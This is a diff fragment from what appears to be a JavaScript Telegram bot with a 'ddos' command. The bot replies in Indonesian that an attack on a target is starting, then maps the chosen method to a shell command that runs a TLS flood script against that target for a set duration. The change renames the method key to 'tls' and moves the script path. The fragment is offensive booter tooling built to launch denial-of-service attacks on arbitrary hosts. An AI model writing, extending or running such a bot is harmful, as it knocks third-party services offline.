@@ -132,7 +132,7 @@ bot.command('ddos', async (ctx) => {
     const initialMessage = await ctx.reply(`Memulai serangan ke ${target} dengan metode ${methods} selama ${duration} detik.`);
 
     const attackMethods = {
-      methodlu: `node ./lib/L7/Tls.js ${target} ${duration} 100 10`,    
+      tls: `node ./lib/mt/Tls.js ${target} ${duration} 100 10`,    
     };
 
     if (attackMethods[methods]) {
